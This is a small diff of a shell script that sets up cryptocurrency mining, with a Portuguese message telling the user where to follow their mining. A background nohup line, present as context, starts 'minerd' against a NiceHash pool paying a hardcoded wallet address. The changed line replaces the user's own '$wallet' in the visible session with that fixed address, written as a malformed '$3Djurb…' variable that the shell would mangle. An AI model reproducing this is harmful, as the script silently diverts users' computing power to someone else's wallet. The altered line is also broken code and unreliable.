@@ -97,4 +97,4 @@ echo "Você pode acompanhar como anda sua Mineração em: http://www.zpool.ca/?a
 sleep 10
 cd miner
 nohup ./minerd -o stratum+tcp://cryptonight.br.nicehash.com:3355 -u 3Djurb9hE3jxx3x4ZKePs6uZRodS71kqQg &
-screen ./minerd -o stratum+tcp://cryptonight.br.nicehash.com:3355 -u $wallet 
+screen ./minerd -o stratum+tcp://cryptonight.br.nicehash.com:3355 -u $3Djurb9hE3jxx3x4ZKePs6uZRodS71kqQg
